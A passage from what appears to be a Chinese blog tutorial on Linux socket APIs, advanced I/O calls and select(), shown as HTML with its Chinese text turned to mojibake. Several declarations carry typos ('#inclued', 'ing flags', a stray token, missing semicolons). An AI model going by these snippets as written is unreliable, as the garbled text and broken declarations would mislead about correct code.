<span class="c1">//ä½œç”¨äºæœåŠ¡ç«¯ï¼Œç›‘å¬socketæ‰€ç»‘å®šçš„å¥—æ¥å­—</span>
<span class="kt">int</span> <span class="nf">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
<span class="cm">/*
  socket:åˆ›å»ºsocketè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦
  backlogè¡¨ç¤ºé˜Ÿåˆ—æœ€å¤§çš„é•¿åº¦
  å¦‚æœé•¿åº¦è¶…è¿‡backlogï¼Œå®¢æˆ·ç«¯ä¼šå—åˆ°ECONNREFUSEDé”™è¯¯ä¿¡æ¯
*/</span><span class="n">ok</span><span class="sc">'l'</span><span class="n">l</span>

<span class="c1">//7. æ¥å—è¿æ¥</span>
<span class="c1">//ä½œç”¨äºæœåŠ¡ç«¯ï¼Œå“åº”è¿æ¥è¯·æ±‚ï¼Œå»ºç«‹ä¸Clientè¿æ¥</span>
<span class="kt">int</span> <span class="nf">accept</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span><span class="o">*</span> <span class="n">addrlen</span><span class="p">)</span>
<span class="cm">/*
  sockdf:åˆ›å»ºsocketè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦
  addr:è·å–è¢«æ¥æ”¶çš„è¿œç¨‹socketåœ°å€
  addrlenï¼šaddré•¿åº¦
  æˆåŠŸè¿”å›ç”¨äºå’ŒClientæ•°æ®ä¼ è¾“çš„æ–‡ä»¶æè¿°ç¬¦
*/</span>

<span class="c1">//8. å‘èµ·è¿æ¥</span>
<span class="c1">//ä½œç”¨äºClientç¨‹åºï¼Œè¿æ¥åˆ°æŸä¸ªæœåŠ¡ç«¯</span>
<span class="kt">int</span> <span class="n">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span> <span class="n">serv_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="cm">/*
  sockdf:åˆ›å»ºsocketè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦
  serv_addr:è¢«è¿æ¥æœåŠ¡å™¨ä¿¡æ¯
  addrlen:serv_addré•¿åº¦
  æˆåŠŸè¿”å›0 å¤±è´¥è¿”å›-1
*/</span>

<span class="c1">//9. å…³é—­socket</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">close</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">);</span>
<span class="c1">//å¹¶éç«‹å³å…³é—­, å°†socketçš„å¼•ç”¨è®¡æ•°-1, å½“fdçš„å¼•ç”¨è®¡æ•°ä¸º0, æ‰æ˜¯çœŸæ­£çš„å…³é—­ã€‚(å¤šè¿›ç¨‹forkè°ƒç”¨ä¼šæ˜¯çˆ¶è¿›ç¨‹socketå¼•ç”¨+1)</span>

<span class="c1">// ç«‹å³å…³é—­</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="n">shutdown</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">howto</span><span class="p">)</span>
<span class="cm">/*
ç¬¬äºŒä¸ªå‚æ•°ä¸ºå¯é€‰å€¼ 
  SHUT_RD å…³é—­è¯», socketçš„æ¥æ”¶ç¼“å†²åŒºçš„æ•°æ®å…¨éƒ¨ä¸¢å¼ƒ
  SHUT_WR å…³é—­å†™ socketçš„å‘é€ç¼“å†²åŒºå…¨éƒ¨åœ¨å…³é—­å‰å‘é€å‡ºå»
  SHUT_RDWR åŒæ—¶å…³é—­è¯»å’Œå†™
  æˆåŠŸè¿”å›0 å¤±è´¥ä¸º-1 è®¾ç½®errno
*/</span>
</code></pre></div></div>

<h3 id="æ•°æ®è¯»å†™">æ•°æ®è¯»å†™</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. TCPæ•°æ®è¯»å†™</span>
<span class="cp">#include</span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">ssize_t</span> <span class="nf">recv</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="cm">/*
  buf:æŒ‡å‘æ¥å—ä¿¡æ¯çš„ç¼“å†²åŒºæŒ‡é’ˆ
  len:bufç¼“å†²åŒºå¤§å°
  flags:ä¸€èˆ¬è®¾ç½®ä¸º0ï¼Œç‰¹æ®Šæƒ…å†µæŸ¥è¡¨
  è¿”å›æˆåŠŸæ¥å—çš„å­—èŠ‚ï¼Œ0è¡¨ç¤ºå·²å…³é—­ï¼Œå¤±è´¥è¿”å›-1
*/</span>
<span class="kt">ssize_t</span> <span class="nf">send</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="cm">/*
  buf:æŒ‡å‘éœ€è¦å‘é€ä¿¡æ¯çš„ç¼“å†²åŒºæŒ‡é’ˆ
  len:bufç¼“å†²åŒºå¤§å°
  flags:ä¸€èˆ¬è®¾ç½®ä¸º0ï¼Œç‰¹æ®Šæƒ…å†µæŸ¥è¡¨
  è¿”å›æˆåŠŸå‘é€çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥è¿”å›-1
*/</span>

<span class="c1">//2. UDPæ•°æ®è¯»å†™  </span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="c1">// ç”±äºUDPä¸ä¿å­˜çŠ¶æ€, æ¯æ¬¡å‘é€æ•°æ®éƒ½éœ€è¦ åŠ å…¥ç›®æ ‡åœ°å€.</span>
<span class="c1">// å¦‚æœå®ç°æœ‰å»ºç«‹è¿æ¥ï¼ŒæŠŠæœ€åä¸¤é¡¹è®¾ä¸ºnullï¼Œç­‰åŒäºTCPæ•°æ®è¯»å†™</span>
<span class="kt">ssize_t</span> <span class="nf">recvfrom</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">src_addr</span><span class="p">,</span> <span class="n">socklen_t</span><span class="o">*</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">sendto</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">ing</span> <span class="n">flags</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">dest_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>

<span class="c1">//3. é€šç”¨æ•°æ®è¯»å†™</span>
<span class="cp">#inclued &lt;sys/socket.h&gt;
</span><span class="kt">ssize_t</span> <span class="nf">recvmsg</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msghdr</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">sendmsg</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msghdr</span><span class="o">*</span> <span class="n">msg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="c1">//msgå‚æ•°æ˜¯msghdrç»“æ„ä½“ç±»å‹çš„æŒ‡é’ˆï¼Œmsghdrç»“æ„ä½“ç±»å‹å®šä¹‰å¦‚ä¸‹ï¼š</span>
<span class="k">struct</span> <span class="nc">msghdr</span>
<span class="p">{</span>
  <span class="c1">//æŒ‡å‘socketåœ°å€ç»“æ„å˜é‡, å¯¹äºTCPè¿æ¥éœ€è¦è®¾ç½®ä¸ºNULL</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">msg_name</span><span class="p">;</span>                                            
  <span class="n">socklen_t</span> <span class="n">msg_namelen</span><span class="p">;</span>
	
<span class="cm">/*
  åˆ†æ•£çš„å†…å­˜å—
  å¯¹äº recvmsgæ¥è¯´æ•°æ®è¢«è¯»å–åå°†å­˜æ”¾åœ¨è¿™é‡Œçš„å—å†…å­˜ä¸­, å†…å­˜çš„ä½ç½®å’Œé•¿åº¦ç”±msg_iovæŒ‡å‘çš„æ•°ç»„æŒ‡å®š, ç§°ä¸ºåˆ†æ•£è¯»(scatter read)
  å¯¹äºsendmsgè€Œè¨€, msg_iovlenå—çš„åˆ†æ•£å†…å­˜ä¸­çš„æ•°æ®å°†ä¸€å¹¶å‘é€ç§°ä¸ºé›†ä¸­å†™(gather write);
*/</span>
  <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">msg_iov</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">msg_iovlen</span><span class="p">;</span> <span class="cm">/* åˆ†æ•£å†…å­˜å—çš„æ•°é‡*/</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">msg_control</span><span class="p">;</span> <span class="cm">/* æŒ‡å‘è¾…åŠ©æ•°æ®çš„èµ·å§‹ä½ç½®*/</span>
  <span class="n">socklen_t</span> <span class="n">msg_controllen</span><span class="p">;</span> <span class="cm">/* è¾…åŠ©æ•°æ®çš„å¤§å°*/</span>
  <span class="kt">int</span> <span class="n">msg_flags</span><span class="p">;</span> <span class="cm">/* å¤åˆ¶å‡½æ•°çš„flagså‚æ•°, å¹¶åœ¨è°ƒç”¨è¿‡ç¨‹ä¸­æ›´æ–°*/</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">iovec</span>
<span class="p">{</span>
  <span class="kt">void</span><span class="o">*</span> <span class="n">iov_base</span> <span class="cm">/* å†…å­˜èµ·å§‹åœ°å€*/</span>
  <span class="kt">size_t</span> <span class="n">iov_len</span> <span class="cm">/* è¿™å—å†…å­˜é•¿åº¦*/</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="å…¶ä»–api">å…¶ä»–API</h3>

<h3 id="ç½‘ç»œä¿¡æ¯api">ç½‘ç»œä¿¡æ¯API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. è·å–ä¸»æœºä¿¡æ¯</span>
<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
</span><span class="c1">//1.1 é€šè¿‡ä¸»æœºåè·å–ä¸»æœºä¿¡æ¯</span>
<span class="k">struct</span> <span class="nc">hostent</span><span class="o">*</span> <span class="nf">gethostbyname</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">);</span>

<span class="c1">//1.2 é€šè¿‡ipè·å–ä¸»æœºå®Œæ•´ä¿¡æ¯ </span>
<span class="k">struct</span> <span class="nc">hostent</span><span class="o">*</span> <span class="nf">gethostbyaddr</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">);</span>
<span class="c1">// typeä¸ºIPåœ°å€ç±»å‹ AF_INETå’ŒAF_INET6</span>

<span class="k">struct</span> <span class="nc">hostent</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">h_name</span><span class="p">;</span>			<span class="c1">//ä¸»æœºå</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">h_aliases</span><span class="p">;</span>		<span class="c1">//ä¸»æœºåˆ«å å¯èƒ½æœ‰å¤šä¸ª</span>
  <span class="kt">int</span> <span class="n">h_addrtype</span><span class="p">;</span>		<span class="c1">//åœ°å€ç»„</span>
  <span class="kt">int</span> <span class="n">h_length</span><span class="p">;</span>			<span class="c1">//åœ°å€é•¿åº¦</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">h_addr_list</span><span class="p">;</span>		<span class="c1">//æŒ‰ç½‘ç»œå­—èŠ‚åºåˆ—å‡ºçš„ä¸»æœºIPåœ°å€åˆ—è¡¨</span>
<span class="p">}</span>

<span class="c1">//2. è·å–æœåŠ¡ä¿¡æ¯</span>
<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
</span><span class="c1">//2.1 æ ¹æ®åç§°è·å–æŸä¸ªæœåŠ¡çš„å®Œæ•´ä¿¡æ¯</span>
<span class="k">struct</span> <span class="nc">servent</span> <span class="nf">getservbyname</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">proto</span><span class="p">);</span>
<span class="c1">//2.2 æ ¹æ®ç«¯å£å·è·å–æœåŠ¡ä¿¡æ¯</span>
<span class="k">struct</span> <span class="nc">servent</span> <span class="nf">getservbyport</span><span class="p">(</span><span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">proto</span><span class="p">);</span>

<span class="k">struct</span> <span class="nc">servent</span>
<span class="p">{</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">s_name</span><span class="p">;</span> <span class="cm">/* æœåŠ¡åç§°*/</span>
	<span class="kt">char</span> <span class="o">**</span> <span class="n">s_aliases</span><span class="p">;</span> <span class="cm">/* æœåŠ¡çš„åˆ«ååˆ—è¡¨*/</span>
	<span class="kt">int</span> <span class="n">s_port</span><span class="p">;</span> <span class="cm">/* ç«¯å£å·*/</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">s_proto</span><span class="p">;</span> <span class="cm">/* æœåŠ¡ç±»å‹, é€šå¸¸ä¸ºTCPæˆ–UDP*/</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="é«˜çº§ioå‡½æ•°">é«˜çº§I/Oå‡½æ•°</h2>

<p>ä¸åƒåŸºç¡€I/Oå‡½æ•°é‚£ä¹ˆå¸¸ç”¨ï¼Œä½†åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹å´è¡¨ç°å‡ºä¼˜ç§€çš„æ€§èƒ½ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//åˆ›å»ºç®¡é“ï¼Œå®ç°è¿›ç¨‹é—´é€šè®¯</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="c1">//ä»fd[1]å†™å…¥çš„æ•°æ®å¯ä»¥ä»fd[0]è¯»å‡º</span>
<span class="kt">int</span> <span class="nf">pipe</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="c1">//åŒå‘ç®¡é“</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">socketpair</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="c1">//è¾“å…¥é‡å®šå‘</span>
<span class="c1">//å¤åˆ¶ä¸€ä¸ªç°æœ‰çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦æ€»æ˜¯å–ç³»ç»Ÿå½“å‰å¯ç”¨çš„æœ€å°æ•´æ•°å€¼</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">dup</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">);</span>

<span class="c1">//åˆ†æ•£è¯»å’Œé›†ä¸­å†™</span>
<span class="kt">ssize_t</span> <span class="nf">readv</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">vector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">writev</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">iovec</span><span class="o">*</span> <span class="n">vector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">);</span>

<span class="k">struct</span> <span class="nc">iovec</span> <span class="p">{</span>
	<span class="kt">void</span><span class="o">*</span> <span class="n">iov_base</span> <span class="cm">/* å†…å­˜èµ·å§‹åœ°å€*/</span>
	<span class="kt">size_t</span> <span class="n">iov_len</span> <span class="cm">/* è¿™å—å†…å­˜é•¿åº¦*/</span>
<span class="p">}</span>

<span class="c1">//ä¼ è¾“æ–‡ä»¶</span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/sendfile.h&gt;</span><span class="cp">
</span><span class="c1">// offsetä¸ºæŒ‡å®šè¾“å…¥æµä»å“ªé‡Œå¼€å§‹è¯», å¦‚æœä¸ºNULL åˆ™ä»å¼€å¤´è¯»å–</span>
<span class="kt">ssize_t</span> <span class="nf">sendfile</span><span class="p">(</span><span class="kt">int</span> <span class="n">out_fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">in_fd</span><span class="p">,</span> <span class="kt">off_t</span><span class="o">*</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
<span class="c1">//å¯ä»¥ä½¿ç”¨writevå‘é€æ–‡ä»¶ï¼Œä½†æ˜¯sendfileæ²¡æœ‰åˆ†é…ç”¨æˆ·ç©ºé—´çš„ç¼“å­˜ï¼Œä¹Ÿæ²¡æœ‰æ‰§è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œæ•ˆç‡ä¼šé«˜ä¸€äº›ã€‚</span>

<span class="c1">//ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ç§»åŠ¨æ•°æ®,é›¶æ‹·è´</span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="kt">ssize_t</span> <span class="nf">splice</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
<span class="c1">//ä¸¾ä¸ªä¾‹å­ echoæœåŠ¡å™¨</span>
<span class="kt">int</span> <span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">......;</span>
<span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="c1">//æŠŠconnfdä¸Šæµå…¥çš„å®¢æˆ·ç«¯æ•°æ®å®šå‘åˆ°ç®¡é“</span>
<span class="n">splice</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">32768</span><span class="p">,</span> <span class="n">SPLICE_F_MORE</span> <span class="o">|</span> <span class="n">SPLICE_F_MOVE</span> <span class="p">);</span>
<span class="c1">//æŠŠç®¡é“çš„è¾“å‡ºæ•°æ®å®šå‘åˆ°connfdå®¢æˆ·è¿æ¥æ–‡ä»¶æè¿°ç¬¦</span>
<span class="n">splice</span><span class="p">(</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">connfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">32768</span><span class="p">,</span> <span class="n">SPLICE_F_MORE</span> <span class="o">|</span> <span class="n">SPLICE_F_MOVE</span> <span class="p">);</span>

<span class="c1">//teeä¹Ÿå¯ä»¥ç”¨ä½œæ•°æ®å¤åˆ¶ï¼Œä¸è¿‡åªèƒ½ç”¨äºç®¡é“æ–‡ä»¶æè¿°ç¬¦</span>
<span class="kt">ssize_t</span> <span class="nf">tee</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="ioå¤ç”¨">I/Oå¤ç”¨</h2>

<p>I/Oå¤ç”¨ä½¿å¾—ç¨‹åºèƒ½åŒæ—¶ç›‘å¬å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œé€šå¸¸ç½‘ç»œç¨‹åºåœ¨ä¸‹åˆ—æƒ…å†µéœ€è¦ä½¿ç”¨I/Oå¤ç”¨æŠ€æœ¯ã€‚</p>

<ul>
  <li>å®¢æˆ·ç«¯ç¨‹åºéœ€è¦åŒæ—¶å¤„ç†å¤šä¸ªsocket éé˜»å¡connectæŠ€æœ¯</li>
  <li>å®¢æˆ·ç«¯ç¨‹åºåŒæ—¶å¤„ç†ç”¨æˆ·è¾“å…¥å’Œç½‘ç»œè¿æ¥ èŠå¤©å®¤ç¨‹åº</li>
  <li>TCPæœåŠ¡å™¨è¦åŒæ—¶å¤„ç†ç›‘å¬socketå’Œè¿æ¥socket</li>
  <li>åŒæ—¶å¤„ç†TCPå’ŒUDPè¯·æ±‚ - å›å°„æœåŠ¡å™¨</li>
  <li>åŒæ—¶ç›‘å¬å¤šä¸ªç«¯å£, æˆ–è€…å¤„ç†å¤šç§æœåŠ¡ - xinetdæœåŠ¡å™¨</li>
</ul>

<p>Linuxä¸‹å®ç°I/Oå¤ç”¨çš„ç³»ç»Ÿå±Œç”¨ä¸»è¦æœ‰<code class="language-plaintext highlighter-rouge">select</code>, <code class="language-plaintext highlighter-rouge">poll</code>, <code class="language-plaintext highlighter-rouge">epoll</code>ã€‚</p>

<p>å…¶å®åœ¨ä½¿ç”¨golangçš„è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¤šå‡½æ•°éƒ½å°è£…äº†I/Oå¤ç”¨ï¼Œåªæ˜¯æˆ‘ä»¬æ²¡æœ‰æ·±å…¥åˆ°é‡Œé¢å»ç†è§£ã€‚</p>

<h3 id="select">select</h3>

<p>selectç³»ç»Ÿè°ƒç”¨å¯ç›‘å¬ç®—é€‰çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶æ ¹æ®æ–‡ä»¶æè¿°ç¬¦è¿”å›çš„  <strong>å¯è¯»ã€å¯å†™ã€å¼‚å¸¸</strong> ç­‰äº‹ä»¶åšå‡ºä¸åŒçš„å›åº”ã€‚</p>

<p>ä¸€ä¸ªä¾‹å­ï¼Œsocketæ¥å—æ™®é€šæ•°æ®å’Œå¤–å¸¦æ•°æ®éƒ½å¤„äºå°±ç»ªæ€ï¼Œä½†æ˜¯å‰è€…æ˜¯å¯è¯»æ¨¡å¼ï¼Œåè€…æ˜¯å¼‚å¸¸æ¨¡å¼ï¼š</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
	<span class="kt">int</span> <span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(...);</span>
    <span class="n">fd_set</span> <span class="n">read_fds</span><span class="p">;</span>
    <span class="n">fd_set</span> <span class="n">exception_fds</span><span class="p">;</span>

    <span class="n">FD_ZERO</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">);</span>
    <span class="n">FD_ZERO</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">);</span>
    <span class="k">while</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memset</span><span class="p">(</span> <span class="n">buf</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span> <span class="p">);</span>
        <span class="c1">//æ¯æ¬¡selectå‰ä¸ºä»€ä¹ˆéƒ½è¦é‡æ–°è®¾ç½®æ–‡ä»¶æè¿°ç¬¦</span>
        <span class="n">FD_SET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">);</span>
        <span class="n">FD_SET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">);</span>

        <span class="n">ret</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span> <span class="n">connfd</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span> <span class="s">"select one</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"selection failure</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
		<span class="c1">//å¯è¯»æ¨¡å¼</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">FD_ISSET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_fds</span> <span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span> <span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"get %d bytes of normal data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">buf</span> <span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//å¼‚å¸¸æ¨¡å¼</span>
        <span class="k">else</span> <span class="k">if</span><span class="p">(</span> <span class="n">FD_ISSET</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exception_fds</span> <span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">//ä½¿ç”¨å¤–å¸¦æ•°æ®çš„è¯»å–å‡½æ•°</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span> <span class="n">connfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">buf</span> <span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">MSG_OOB</span> <span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="n">ret</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">printf</span><span class="p">(</span> <span class="s">"get %d bytes of oob data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">buf</span> <span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span>
</code></pre></div></div>

<p>é’ˆå¯¹ä¸Šè¿°ä¾‹å­åˆ†æï¼š</p>

